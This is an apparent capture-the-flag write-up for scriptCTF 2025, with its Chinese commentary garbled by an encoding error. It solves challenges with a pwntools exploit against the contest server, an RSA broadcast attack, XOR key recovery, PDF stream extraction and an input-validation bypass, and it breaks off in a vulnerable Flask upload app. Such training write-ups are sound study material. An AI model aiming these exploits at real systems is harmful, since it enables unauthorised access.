---
title: 2025ScriptCTF
date: 2025-08-18 20:35
categories: æ¯”èµ›
tags:
  - æ¯”èµ›
author: DmcforSpc
---
## MISC
### Read The Rules
![](assets/img/attachments/QQ_1755340324524.png)  

ç‚¹ hereï¼Œåœ¨ç‚¹ here  
![](assets/img/attachments/QQ_1755340364363.png)  

`scriptCTF{600D_1ucK_5011D3r1}`  


### Div
```python
import os
import decimal
decimal.getcontext().prec = 50

secret = int(os.urandom(16).hex(),16)
num = input('Enter a number: ')

if 'e' in num.lower():
    print("Nice try...")
    exit(0)

if len(num) >= 10:
    print('Number too long...')
    exit(0)

fl_num = decimal.Decimal(num)
div = secret / fl_num

if div == 0:
    print(open('flag.txt').read().strip())
else:
    print('Try again...')
```
è¿™é“é¢˜ç›®çš„ç›®æ ‡æ˜¯è®© `if div == 0:` è¿™ä¸ªæ¡ä»¶æˆç«‹ï¼Œä»è€Œæ‰“å°å‡º `flag.txt` é‡Œçš„å†…å®¹ã€‚

---

#### ä»£ç é€»è¾‘åˆ†æ

æˆ‘ä»¬ä¸€æ­¥æ­¥æ¥çœ‹ä»£ç åšäº†ä»€ä¹ˆï¼š

1. **`import os, decimal`**: å¯¼å…¥äº†ä¸¤ä¸ªåº“ï¼Œ`os` ç”¨äºç”Ÿæˆéšæœºæ•°ï¼Œ`decimal` ç”¨äºé«˜ç²¾åº¦çš„æ•°å­¦è¿ç®—ã€‚
    
2. **`decimal.getcontext().prec = 50`**: è®¾ç½®äº† `decimal` åº“çš„è®¡ç®—ç²¾åº¦ä¸º50ä½æœ‰æ•ˆæ•°å­—ã€‚è¿™æ˜¯ä¸€ä¸ªå…³é”®ä¿¡æ¯ï¼Œä½†å¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ªè¿·æƒ‘é¡¹ã€‚
    
3. **`secret = int(os.urandom(16).hex(),16)`**: ç”Ÿæˆä¸€ä¸ª128ä½çš„åŠ å¯†çº§å¼ºéšæœºæ•´æ•°ã€‚è¿™ä¸ª `secret` æ•°å­—éå¸¸å¤§ï¼Œå¹¶ä¸”ä¸å¯èƒ½æ˜¯0ã€‚
    
4. **`num = input('Enter a number: ')`**: è¦æ±‚ç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•°å­—ã€‚
    
5. **`if 'e' in num.lower():`**: æ£€æŸ¥ç”¨æˆ·çš„è¾“å…¥ä¸­æ˜¯å¦åŒ…å«å­—æ¯ 'e'ï¼ˆä¸åˆ†å¤§å°å†™ï¼‰ã€‚å¦‚æœåŒ…å«ï¼Œå°±é€€å‡ºã€‚è¿™æ˜¯ä¸ºäº†**é˜²æ­¢ç”¨æˆ·ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•**æ¥è¾“å…¥ä¸€ä¸ªéå¸¸å¤§æˆ–éå¸¸å°çš„æ•°ï¼ˆä¾‹å¦‚ `1e50`ï¼‰ã€‚
    
6. **`if len(num) >= 10:`**: æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚å¦‚æœé•¿åº¦å¤§äºç­‰äº10ï¼Œå°±é€€å‡ºã€‚è¿™**é™åˆ¶äº†æˆ‘ä»¬èƒ½ç›´æ¥è¾“å…¥çš„æ•°å­—çš„å¤§å°**ï¼Œæœ€å¤§åªèƒ½æ˜¯9ä½æ•°çš„æ•´æ•°ï¼ˆå¦‚ `999999999`ï¼‰ã€‚
    
7. **`fl_num = decimal.Decimal(num)`**: å°†ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸² `num` è½¬æ¢æˆä¸€ä¸ªé«˜ç²¾åº¦çš„ `Decimal` å¯¹è±¡ã€‚
    
8. **`div = secret / fl_num`**: ç”¨é‚£ä¸ªå·¨å¤§çš„éšæœºæ•° `secret` é™¤ä»¥æˆ‘ä»¬è¾“å…¥çš„æ•°å­— `fl_num`ã€‚
    
9. **`if div == 0:`**: åˆ¤æ–­ä¸Šä¸€æ­¥é™¤æ³•çš„ç»“æœ `div` æ˜¯å¦ç­‰äº0ã€‚å¦‚æœç­‰äº0ï¼Œå°±æˆåŠŸäº†ï¼
    

---

#### æ ¸å¿ƒé—®é¢˜ ğŸ¤”

**å¦‚ä½•è®©ä¸€ä¸ªä¸ä¸ºé›¶çš„æ•° (`secret`) é™¤ä»¥æˆ‘ä»¬è¾“å…¥çš„æ•° (`fl_num`) ä¹‹åï¼Œç»“æœç­‰äºé›¶ï¼Ÿ**

åœ¨å¸¸è§„æ•°å­¦é‡Œï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚ä½†åœ¨è®¡ç®—æœºç¼–ç¨‹ä¸­ï¼Œç‰¹åˆ«æ˜¯å¤„ç†æµ®ç‚¹æ•°æ—¶ï¼Œæœ‰å‡ ç§å¯èƒ½ï¼š

1. **ä¸‹æº¢ (Underflow)**: å¦‚æœé™¤æ•° `fl_num` æ˜¯ä¸€ä¸ªæå…¶å·¨å¤§çš„æ•°å­—ï¼Œé‚£ä¹ˆ `secret / fl_num` çš„ç»“æœä¼šéå¸¸æ¥è¿‘äº0ã€‚å¦‚æœè¿™ä¸ªç»“æœå°äºäº†è®¡ç®—æœºèƒ½è¡¨ç¤ºçš„æœ€å°ç²¾åº¦ï¼Œå®ƒå°±ä¼šè¢«å½“ä½œ0ã€‚ä½†æ˜¯ï¼Œç”±äºè¾“å…¥é•¿åº¦è¢«é™åˆ¶åœ¨10ä¸ªå­—ç¬¦ä»¥å†…ï¼Œæˆ‘ä»¬æ— æ³•è¾“å…¥ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ•°å­—ï¼ˆæ¯”å¦‚ `1` åé¢è·Ÿå‡ åä¸ª `0`ï¼‰æ¥é€ æˆä¸‹æº¢ã€‚
    
2. **åˆ©ç”¨ç‰¹æ®Šå€¼**: è®¡ç®—æœºçš„æ•°å­¦åº“ï¼ˆåŒ…æ‹¬ Python çš„ `decimal`ï¼‰é€šå¸¸æ”¯æŒä¸€äº›ç‰¹æ®Šçš„æ•°å€¼ï¼Œæ¯”å¦‚**æ— ç©·å¤§ (Infinity)** å’Œ**éæ•°å€¼ (NaN, Not a Number)**ã€‚
    

---

#### è§£é¢˜æ€è·¯ä¸ç­”æ¡ˆ ğŸ’¡

è¿™é“é¢˜çš„çªç ´å£åœ¨äº `fl_num = decimal.Decimal(num)` è¿™è¡Œä»£ç ã€‚`decimal` æ¨¡å—åœ¨è½¬æ¢å­—ç¬¦ä¸²æ—¶ï¼Œèƒ½è¯†åˆ«ä¸€äº›ç‰¹æ®Šçš„å•è¯ã€‚

æ ¹æ® `decimal` æ¨¡å—çš„è§„åˆ™ï¼Œå­—ç¬¦ä¸² `'Infinity'` æˆ–è€… `'inf'` ä¼šè¢«ç›´æ¥è½¬æ¢æˆä¸€ä¸ªè¡¨ç¤º**æ­£æ— ç©·å¤§**çš„ `Decimal` å¯¹è±¡ã€‚

è®©æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹è¿™ä¸ªæƒ³æ³•ï¼š

- **è¾“å…¥ `inf`**ï¼š
    
    1. `'e' in 'inf'.lower()` -> ä¸åŒ…å« 'e'ï¼Œæ£€æŸ¥é€šè¿‡ âœ…ã€‚
        
    2. `len('inf')` æ˜¯ 3ï¼Œå°äº 10ï¼Œæ£€æŸ¥é€šè¿‡ âœ…ã€‚
        
    3. `decimal.Decimal('inf')` ä¼šæˆåŠŸåˆ›å»ºä¸€ä¸ªä»£è¡¨æ— ç©·å¤§çš„å¯¹è±¡ã€‚
        
- **è¿›è¡Œé™¤æ³•è¿ç®—**ï¼š å½“ä»£ç æ‰§è¡Œ `div = secret / fl_num` æ—¶ï¼Œå°±ç›¸å½“äºåœ¨è®¡ç®—ï¼š

$$
div = \frac{\text{ä¸€ä¸ªå·¨å¤§çš„æœ‰é™æ•° (secret)}}{\infty}
$$
    
    åœ¨ä»»ä½•æ ‡å‡†çš„æµ®ç‚¹æ•°è¿ç®—ä¸­ï¼Œ**ä¸€ä¸ªæœ‰é™çš„æ•°é™¤ä»¥æ— ç©·å¤§ï¼Œç»“æœå°±æ˜¯ 0**ã€‚
    
- **æœ€ç»ˆåˆ¤æ–­**ï¼š `div` çš„å€¼å˜æˆäº† `0`ï¼Œå› æ­¤ `div == 0` çš„æ¡ä»¶æˆç«‹ï¼Œç¨‹åºå°±ä¼šæ‰“å°å‡º flagã€‚
    

æ‰€ä»¥ï¼Œè¿™é“é¢˜çš„æ­£ç¡®ç­”æ¡ˆå°±æ˜¯è¾“å…¥ **`inf`** æˆ–è€… **`Infinity`**ã€‚

**æ€»ç»“ä¸€ä¸‹**ï¼šè¿™é“é¢˜å¹¶ä¸æ˜¯è€ƒå¯Ÿå¤æ‚çš„æ•°å­¦è®¡ç®—ï¼Œè€Œæ˜¯è€ƒå¯Ÿå¯¹ Python `decimal` åº“ç‰¹æ®Šå€¼å¤„ç†çš„äº†è§£ã€‚å®ƒé€šè¿‡é™åˆ¶è¾“å…¥é•¿åº¦å’Œç¦ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œå¼•å¯¼æˆ‘ä»¬å»æ€è€ƒé™¤äº†å¸¸è§„æ•°å­—ä¹‹å¤–çš„ç‰¹æ®Šè¾“å…¥ã€‚

![](assets/img/attachments/QQ_1755340599915.png)  

`scriptCTF{70_1nf1n17y_4nd_b3y0nd_926fc2aa86dc}`

### emoji
ç»™äº†ä¸€äº›å›¾å½¢ç¼–ç   
```text
ğŸ³ğŸ£ğŸ²ğŸ©ğŸ°ğŸ´ğŸƒğŸ”ğŸ†ğŸ»ğŸ€³ğŸ­ğŸ€°ğŸªğŸ€±ğŸŸğŸ€³ğŸ®ğŸ£ğŸ€°ğŸ¤ğŸ€±ğŸ®ğŸ§ğŸŸğŸ€±ğŸ³ğŸŸğŸ·ğŸ€³ğŸ€±ğŸ²ğŸ¤ğŸŸğŸ€´ğŸ®ğŸ¤ğŸŸğŸ¦ğŸµğŸ®ğŸ€¡ğŸ€±ğŸ¥ğŸ€´ğŸ€¶ğŸ¤ğŸ½
```

- æ–‡æœ¬ç”±ä¸€ä¸²â€œå¤šç±³è¯º/éº»å°†ç‰Œâ€ç±» emoji æ„æˆï¼ˆå¦‚ DOMINO TILE VERTICAL-02-02ã€MAHJONG TILE NINE OF CIRCLES ç­‰ï¼‰ã€‚
- è¿™äº›å­—ç¬¦çš„ Unicode ç ç‚¹éƒ½åœ¨ U+1F0xx èŒƒå›´ã€‚å°†æ¯ä¸ªå­—ç¬¦çš„ç ç‚¹å–æœ€ä½ 8 ä½ï¼ˆæŒ‰å­—èŠ‚å–ä½ä½ï¼‰å¾€å¾€æ˜¯è¿™ç±» emoji ç¼–ç é¢˜çš„å¥—è·¯ï¼Œå¯è¿˜åŸå‡º ASCIIã€‚

```python
s = "ğŸ³ğŸ£ğŸ²ğŸ©ğŸ°ğŸ´ğŸƒğŸ”ğŸ†ğŸ»ğŸ€³ğŸ­ğŸ€°ğŸªğŸ€±ğŸŸğŸ€³ğŸ®ğŸ£ğŸ€°ğŸ¤ğŸ€±ğŸ®ğŸ§ğŸŸğŸ€±ğŸ³ğŸŸğŸ·ğŸ€³ğŸ€±ğŸ²ğŸ¤ğŸŸğŸ€´ğŸ®ğŸ¤ğŸŸğŸ¦ğŸµğŸ®ğŸ€¡ğŸ€±ğŸ¥ğŸ€´ğŸ€¶ğŸ¤ğŸ½"
msg = ''.join(chr(ord(ch) & 0xff) for ch in s)
print(msg)
print(repr(msg))
```

`scriptCTF{3m0j1_3nc0d1ng_1s_w31rd_4nd_fun!1e46d}`

### Div 2
```python
import secrets
import decimal
decimal.getcontext().prec = 50
secret =  secrets.randbelow(1 << 127) + (1 << 127) # Choose a 128 bit number
for _ in range(1000):
    print("[1] Provide a number\n[2] Guess the secret number")
    choice = int(input("Choice: "))
    if choice == 1:
        num = input('Enter a number: ')
        fl_num = decimal.Decimal(num)
        assert int(fl_num).bit_length() == secret.bit_length()
        div = secret / fl_num
        print(int(div))
    if choice == 2:
        guess = int(input("Enter secret number: "))
        if guess == secret:
            print(open('flag.txt').read().strip())
        else:
            print("Incorrect!")
        exit(0)

```

- secret æ˜¯ 128 ä½æ•´æ•°ï¼Œè¾“å…¥æ•°å­— `num` ä¸ secret åŒä½æ•°ã€‚
    
- è¿”å› `q = int(secret / num)`ã€‚
    
- ç”± div å¯å¾— secret çš„èŒƒå›´ï¼š
$$
secret=qâ‹…num+r,0â‰¤r<num
$$
- æ¯æ¬¡æŸ¥è¯¢åï¼Œæ›´æ–° secret çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ï¼š
    
    - `LOW = max(LOW, q*num)`
        
    - `HIGH = min(HIGH, q*num + num - 1)`
        
- å¾ªç¯å¤šæ¬¡åï¼Œ`LOW == HIGH`ï¼Œå°±æ˜¯ secret çš„ç²¾ç¡®å€¼ã€‚

exp  
```python
from pwn import *
from decimal import Decimal, getcontext

getcontext().prec = 50

HOST = "play.scriptsorcerers.xyz"
PORT = 10271

# 128ä½èŒƒå›´
LOW = 1 << 127
HIGH = (1 << 128) - 1

def query(num):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"Enter a number: ", str(num).encode())
    
    data = p.recvuntil(b"[1] Provide a number\n[2] Guess the secret number")
    for line in data.split(b"\n"):
        line = line.strip()
        if line.isdigit():
            return int(line)
    raise ValueError("Did not get a valid number from server")

p = remote(HOST, PORT)

for _ in range(1000):
    mid = (LOW + HIGH) // 2
    mid |= (1 << 127)  # ä¿è¯128ä½
    div = query(mid)
    
    # æ›´æ–°èŒƒå›´
    LOW = max(LOW, div * mid)
    HIGH = min(HIGH, div * mid + mid - 1)
    
    if LOW == HIGH:
        break

# æœ€ç»ˆæäº¤
secret = LOW
p.sendlineafter(b"Choice: ", b"2")
p.sendlineafter(b"Enter secret number: ", str(secret).encode())

print(p.recvline().decode())
```


## Crypto
### RSA-1
```python
n1 = 156503881374173899106040027210320626006530930815116631795516553916547375688556673985142242828597628615920973708595994675661662789752600109906259326160805121029243681236938272723595463141696217880136400102526509149966767717309801293569923237158596968679754520209177602882862180528522927242280121868961697240587
c1 = 77845730447898247683281609913423107803974192483879771538601656664815266655476695261695401337124553851404038028413156487834500306455909128563474382527072827288203275942719998719612346322196694263967769165807133288612193509523277795556658877046100866328789163922952483990512216199556692553605487824176112568965

n2 = 81176790394812943895417667822424503891538103661290067749746811244149927293880771403600643202454602366489650358459283710738177024118857784526124643798095463427793912529729517724613501628957072457149015941596656959113353794192041220905793823162933257702459236541137457227898063370534472564804125139395000655909
c2 = 40787486105407063933087059717827107329565540104154871338902977389136976706405321232356479461501507502072366720712449240185342528262578445532244098369654742284814175079411915848114327880144883620517336793165329893295685773515696260299308407612535992098605156822281687718904414533480149775329948085800726089284

n3 = 140612513823906625290578950857303904693579488575072876654320011261621692347864140784716666929156719735696270348892475443744858844360080415632704363751274666498790051438616664967359811895773995052063222050631573888071188619609300034534118393135291537302821893141204544943440866238800133993600817014789308510399
c3 = 100744134973371882529524399965586539315832009564780881084353677824875367744381226140488591354751113977457961062275480984708865578896869353244823264759044617432862876208706282555040444253921290103354489356742706959370396360754029015494871561563778937571686573716714202098622688982817598258563381656498389039630

e = 3
```

- å·²çŸ¥ä¸‰ä¸ªä¸åŒçš„æ¨¡æ•° `n1, n2, n3`ã€‚
    
- ç›¸åŒæ˜æ–‡ `m` è¢«åˆ†åˆ«åŠ å¯†å¾—åˆ° `c1, c2, c3`ã€‚
    
- å…¬é’¥æŒ‡æ•° `e = 3`ã€‚
    
- è¿™æ˜¯ **HÃ¥stadâ€™s Broadcast Attack** çš„å…¸å‹åœºæ™¯ã€‚
    

åŸç†ï¼š

1. å¯¹äºæ¯ä¸ªå¯†æ–‡ï¼š
$$
ci= m^3 \mod n_i
$$â€‹

2. å› ä¸º `n1, n2, n3` äº’ç´ ï¼Œå¯ä»¥ç”¨ **ä¸­å›½å‰©ä½™å®šç† (CRT)** æ±‚è§£ï¼š

$$
m3â‰¡C(modN),N=n1â‹…n2â‹…n3
$$

3. æ±‚å‡º `C` åï¼Œç”±äº$m3<n1â‹…n2â‹…n3$å¯ä»¥ç›´æ¥å¼€ç«‹æ–¹æ ¹å¾—åˆ°æ˜æ–‡ `m`ã€‚

exp  
```python
from sympy import integer_nthroot

# å·²çŸ¥å‚æ•°
n1 = 156503881374173899106040027210320626006530930815116631795516553916547375688556673985142242828597628615920973708595994675661662789752600109906259326160805121029243681236938272723595463141696217880136400102526509149966767717309801293569923237158596968679754520209177602882862180528522927242280121868961697240587
c1 = 77845730447898247683281609913423107803974192483879771538601656664815266655476695261695401337124553851404038028413156487834500306455909128563474382527072827288203275942719998719612346322196694263967769165807133288612193509523277795556658877046100866328789163922952483990512216199556692553605487824176112568965

n2 = 81176790394812943895417667822424503891538103661290067749746811244149927293880771403600643202454602366489650358459283710738177024118857784526124643798095463427793912529729517724613501628957072457149015941596656959113353794192041220905793823162933257702459236541137457227898063370534472564804125139395000655909
c2 = 40787486105407063933087059717827107329565540104154871338902977389136976706405321232356479461501507502072366720712449240185342528262578445532244098369654742284814175079411915848114327880144883620517336793165329893295685773515696260299308407612535992098605156822281687718904414533480149775329948085800726089284

n3 = 140612513823906625290578950857303904693579488575072876654320011261621692347864140784716666929156719735696270348892475443744858844360080415632704363751274666498790051438616664967359811895773995052063222050631573888071188619609300034534118393135291537302821893141204544943440866238800133993600817014789308510399
c3 = 100744134973371882529524399965586539315832009564780881084353677824875367744381226140488591354751113977457961062275480984708865578896869353244823264759044617432862876208706282555040444253921290103354489356742706959370396360754029015494871561563778937571686573716714202098622688982817598258563381656498389039630

e = 3

# ä¸­å›½å‰©ä½™å®šç†æ±‚è§£ m^3
N = n1 * n2 * n3
m1 = n2 * n3
m2 = n1 * n3
m3 = n1 * n2

inv1 = pow(m1, -1, n1)
inv2 = pow(m2, -1, n2)
inv3 = pow(m3, -1, n3)

C = (c1*m1*inv1 + c2*m2*inv2 + c3*m3*inv3) % N

# å¼€ç«‹æ–¹æ ¹
m, exact = integer_nthroot(C, e)
if exact:
    print("æ˜æ–‡ m =", m)
    print("æ˜æ–‡ bytes =", m.to_bytes((m.bit_length() + 7) // 8, 'big'))
else:
    print("æ— æ³•ç²¾ç¡®å¼€ç«‹æ–¹æ ¹")
```

### Secure-Server

```python
import os
from pwn import xor
print("With the Secure Server, sharing secrets is safer than ever!")
enc = bytes.fromhex(input("Enter the secret, XORed by your key (in hex): ").strip())
key = os.urandom(32)
enc2 = xor(enc,key).hex()
print(f"Double encrypted secret (in hex): {enc2}")
dec = bytes.fromhex(input("XOR the above with your key again (in hex): ").strip())
secret = xor(dec,key)
print("Secret received!")



# With the Secure Server, sharing secrets is safer than ever!
# Enter the secret, XORed by your key (in hex): 
# 151e71ce4addf692d5bac83bb87911a20c39b71da3fa5e7ff05a2b2b0a83ba03

# Double encrypted secret (in hex): e1930164280e44386b389f7e3bc02b707188ea70d9617e3ced989f15d8a10d70
# XOR the above with your key again (in hex): 
# 87ee02c312a7f1fef8f92f75f1e60ba122df321925e8132068b0871ff303960e

# Secret received!
```

**è„šæœ¬é€»è¾‘**
1. ç”¨æˆ·è¾“å…¥ä¸€æ¬¡ **å·²ç”¨æŸä¸ª key XOR è¿‡çš„ç§˜å¯†** `enc`ï¼ˆhex æ ¼å¼ï¼‰ã€‚
    
2. æœåŠ¡å™¨ç”Ÿæˆ **éšæœº 32 å­—èŠ‚ key** `key`ã€‚
    
3. æœåŠ¡å™¨å†æ¬¡ XORï¼š`enc2 = xor(enc, key)`ï¼Œå¹¶è¾“å‡º `enc2`ã€‚
    
4. ç”¨æˆ·å†æ¬¡è¾“å…¥ `enc2 XOR key`ï¼ŒæœåŠ¡å™¨è§£å¯†ä¸€æ¬¡ï¼š`secret = xor(dec, key)`ï¼Œå¾—åˆ°æœ€ç»ˆç§˜å¯†ã€‚
    

ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè®°ä¸ºæ•°å­¦å½¢å¼ï¼š

- ç”¨æˆ·è¾“å…¥çš„ `enc = secret XOR key_user`
    
- æœåŠ¡å™¨ç”Ÿæˆ `key_server = key`
    
- è¾“å‡º `enc2 = enc XOR key_server = secret XOR key_user XOR key_server`
    
- ç”¨æˆ·è¾“å…¥ `dec = enc2 XOR key_user = secret XOR key_server`
    
- æœåŠ¡å™¨è§£å¯†ï¼š`secret = dec XOR key_server = secret`

exp  
```python
from pwn import xor

enc  = bytes.fromhex("151e71ce4addf692d5bac83bb87911a20c39b71da3fa5e7ff05a2b2b0a83ba03")
enc2 = bytes.fromhex("e1930164280e44386b389f7e3bc02b707188ea70d9617e3ced989f15d8a10d70")
dec  = bytes.fromhex("87ee02c312a7f1fef8f92f75f1e60ba122df321925e8132068b0871ff303960e")

# æ¢å¤æœåŠ¡å™¨éšæœº key
key_server = xor(enc2, enc)

# è§£å¯†æœ€ç»ˆ secret
secret = xor(dec, key_server)

print(secret)
```

`scriptCTF{x0r_1s_not_s3cur3!!!!}`

## Forensics 

### diskchal
æŒ‚è½½ç£ç›˜  
![](assets/img/attachments/Pasted%20image%2020250817142025.png)  

æ¢å¤æ–‡ä»¶ï¼Œè§£å‹  
![](assets/img/attachments/QQ_1755411650254.png)  

`scriptCTF{1_l0v3_m461c_7r1ck5}`

### pdf
æ‰“å¼€æ–‡ä»¶ï¼Œè¿™é‡Œéšè—äº†ä¸€ä¸ªflagï¼Œä½†æ˜¯æ˜¯å‡çš„  
![](assets/img/attachments/QQ_1755412907358.png)  

ä½¿ç”¨è„šæœ¬æå–å‹ç¼©æ•°æ®  
```python
import re
import zlib

def extract_and_decompress_streams(pdf_path):
    """
    Opens a PDF file, finds all streams, and attempts to decompress them.
    
    Args:
        pdf_path (str): The path to the PDF file.
    """
    try:
        with open(pdf_path, 'rb') as f:
            content = f.read()
        print(f"âœ… Successfully read {pdf_path}. Total size: {len(content)} bytes.\n")
    except FileNotFoundError:
        print(f"âŒ é”™è¯¯: æ–‡ä»¶æœªæ‰¾åˆ° '{pdf_path}'")
        print("â¡ï¸ è¯·ç¡®ä¿è„šæœ¬ä¸­çš„ PDF_FILE_PATH å˜é‡è®¾ç½®äº†æ­£ç¡®çš„æ–‡ä»¶è·¯å¾„ã€‚")
        return

    # æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæŸ¥æ‰¾PDFå¯¹è±¡å¤´ï¼Œä¾‹å¦‚ "7 0 obj"
    obj_header_pattern = re.compile(br'(\d+)\s+(\d+)\s+obj')
    # æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæŸ¥æ‰¾æµçš„é•¿åº¦ï¼Œä¾‹å¦‚ "/Length 58"
    length_pattern = re.compile(br'/Length\s+(\d+)')

    idx = 0
    stream_count = 0
    while True:
        # æŸ¥æ‰¾ä¸‹ä¸€ä¸ª 'stream' å…³é”®å­—
        stream_start_keyword = content.find(b'stream', idx)
        if stream_start_keyword == -1:
            break
        
        stream_count += 1
        print(f"--- Stream #{stream_count} Found ---")

        # å®šä½ stream æ•°æ®çš„çœŸæ­£èµ·å§‹ä½ç½®
        # æ ¹æ® PDF è§„èŒƒï¼Œ'stream' å…³é”®å­—åé€šå¸¸è·Ÿä¸€ä¸ªå›è½¦(CR)å’Œæ¢è¡Œ(LF)ï¼Œæˆ–è€…åªæœ‰ä¸€ä¸ªæ¢è¡Œ(LF)
        data_start = stream_start_keyword + len(b'stream')
        # è·³è¿‡å¯èƒ½å­˜åœ¨çš„ç©ºæ ¼å’Œæ¢è¡Œç¬¦
        while content[data_start:data_start+1] in b' \r\n':
            data_start += 1

        # æŸ¥æ‰¾ 'endstream' å…³é”®å­—æ¥ç¡®å®šæ•°æ®æµçš„æœ«å°¾
        stream_end_keyword = content.find(b'endstream', data_start)
        if stream_end_keyword == -1:
            break

        # æå–æµçš„åŸå§‹æ•°æ®
        raw_data = content[data_start:stream_end_keyword]
        
        # --- è§£æä¸æ­¤æµç›¸å…³çš„å­—å…¸å’Œå¯¹è±¡ä¿¡æ¯ ---
        
        # å‘å‰æœç´¢ï¼Œæ‰¾åˆ°æµä¹‹å‰çš„ '<<' å­—å…¸å¼€å§‹ç¬¦å·
        dict_start = content.rfind(b'<<', 0, stream_start_keyword)
        dict_bytes = b''
        obj_num = (-1, -1)
        length_from_dict = None
        
        if dict_start != -1:
            # æ‰¾åˆ°åŒ¹é…çš„ '>>' å­—å…¸ç»“æŸç¬¦å·
            dict_end = content.find(b'>>', dict_start, stream_start_keyword)
            if dict_end != -1:
                dict_bytes = content[dict_start : dict_end + 2]
                
                # ä»å­—å…¸ä¸­è§£æ /Length
                len_match = length_pattern.search(dict_bytes)
                if len_match:
                    length_from_dict = int(len_match.group(1))

            # è¿›ä¸€æ­¥å‘å‰æŸ¥æ‰¾å¯¹è±¡å¤´ (e.g., "12 0 obj")
            header_start = content.rfind(b'obj', 0, dict_start)
            # æœç´¢èŒƒå›´é™å®šåœ¨å¯¹è±¡å¤´å’Œå­—å…¸ä¹‹é—´
            header_search_region = content[max(0, header_start - 20) : header_start + 3]
            obj_match = obj_header_pattern.search(header_search_region)
            if obj_match:
                obj_num = (int(obj_match.group(1)), int(obj_match.group(2)))

        print(f"ğŸ“„ Object Number: {obj_num[0]} {obj_num[1]}")
        print(f"ğŸ“– Dictionary Snippet: {dict_bytes[:100].strip().decode('latin1', 'ignore')}")

        # æ ¹æ®å­—å…¸ä¸­çš„ /Length å€¼æ¥ç²¾ç¡®ç¡®å®šæµæ•°æ®
        # æœ‰äº›PDFçš„ endstream å‰ä¼šæœ‰é¢å¤–çš„æ¢è¡Œç¬¦ï¼Œ/Length æ˜¯æœ€å‡†çš„
        stream_data = raw_data
        if length_from_dict is not None:
            print(f"ğŸ“ Claimed Length: {length_from_dict}, Actual Data before 'endstream': {len(raw_data)}")
            stream_data = raw_data[:length_from_dict]
        else:
            print(f"ğŸ“ Claimed Length: Not found, using data until 'endstream'. Size: {len(stream_data)}")

        # --- å°è¯•è§£å‹ç¼© ---

        # æ£€æŸ¥å­—å…¸ä¸­æ˜¯å¦æœ‰ /FlateDecode è¿‡æ»¤å™¨
        if b'/FlateDecode' in dict_bytes:
            print("ğŸ“¦ Filter: /FlateDecode detected. Attempting decompression...")
            decompressed = None
            # zlib.decompress çš„ wbits å‚æ•°å¾ˆå…³é”®ï¼š
            # é»˜è®¤å€¼ (15): æœŸæœ›æ•°æ®åŒ…å« zlib å¤´éƒ¨å’Œæ ¡éªŒå’Œã€‚
            # è´Ÿå€¼ (-15): è¡¨ç¤ºæ•°æ®æ˜¯çº¯ç²¹çš„ DEFLATE å‹ç¼©æµï¼Œæ²¡æœ‰ zlib å¤´éƒ¨ã€‚PDF ä¸­å¾ˆå¸¸è§ã€‚
            try:
                # é¦–å…ˆå°è¯•æ ‡å‡†æ¨¡å¼
                decompressed = zlib.decompress(stream_data)
                print("âœ… Decompressed successfully (standard zlib header).")
            except zlib.error:
                try:
                    # å¦‚æœå¤±è´¥ï¼Œå°è¯• raw DEFLATE æ¨¡å¼
                    decompressed = zlib.decompress(stream_data, wbits=-15)
                    print("âœ… Decompressed successfully (raw DEFLATE stream).")
                except zlib.error as e:
                    print(f"âŒ Decompression failed for both modes. Error: {e}")
            
            if decompressed:
                # è¿‡æ»¤æ‰äºŒè¿›åˆ¶ä¹±ç ï¼Œåªæ˜¾ç¤ºå¯æ‰“å°å­—ç¬¦ï¼Œä¾¿äºé¢„è§ˆ
                visible_text = ''.join(chr(c) for c in decompressed if 32 <= c <= 126 or c in (10, 13))
                print(f"ğŸ“œ Decompressed Content (first 500 chars):\n---\n{visible_text[:500]}\n---\n")

        else:
            # å¦‚æœæ²¡æœ‰å‹ç¼©æˆ–ä½¿ç”¨äº†å…¶ä»–æœªå¤„ç†çš„å‹ç¼©æ–¹å¼
            print("ğŸ“¦ Filter: No /FlateDecode filter. Displaying raw visible content.")
            visible_text = ''.join(chr(c) for c in stream_data if 32 <= c <= 126 or c in (10, 13))
            print(f"ğŸ“œ Raw Content (first 500 chars):\n---\n{visible_text[:500]}\n---\n")

        # æ›´æ–°ç´¢å¼•ï¼Œä»å½“å‰ 'endstream' ä¹‹åç»§ç»­æœç´¢
        idx = stream_end_keyword + len(b'endstream')

    if stream_count == 0:
        print("ğŸ¤· No streams found in the document.")


# ä¸»ç¨‹åºå…¥å£
if __name__ == "__main__":
    PDF_FILE_PATH = "challenge.pdf"
    extract_and_decompress_streams(PDF_FILE_PATH)
```

```text
âœ… Successfully read challenge.pdf. Total size: 8068 bytes.

--- Stream #1 Found ---
ğŸ“„ Object Number: 4 0
ğŸ“– Dictionary Snippet: << /Length 48 /Filter /FlateDecode >>
ğŸ“ Claimed Length: 48, Actual Data before 'endstream': 49
ğŸ“¦ Filter: /FlateDecode detected. Attempting decompression...
âœ… Decompressed successfully (standard zlib header).
ğŸ“œ Decompressed Content (first 500 chars):
---
scriptCTF{pdf_s7r34m5_0v3r_7w17ch_5tr34ms}
---
......
```

## WEB
### Renderer
```python
from flask import Flask, request, redirect, render_template, make_response, url_for
app = Flask(__name__)
from hashlib import sha256
import os
def allowed(name):
    if name.split('.')[1] in ['jpg','jpeg','png','svg']:
        return True
    return False

@app.route('/',methods=['GET','POST'])
def upload():
    if request.method == 'POST':
        if 'file' not in request.files:
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return redirect(request.url)
        if file and allowed(file.filename):
            filename = file.filename
            hash = sha256(os.urandom(32)).hexdigest()
            filepath = f'./static/uploads/{hash}.{filename.split(".")[1]}'
            file.save(filepath)
            return redirect(f'/render/{hash}.{filename.split(".")[1]}')
    return render_template('upload.html')

@app.route('/render/<path:filename>')
def render(filename):
    return render_template('display.html', filename=filename)

@app.route('/developer')
def developer():
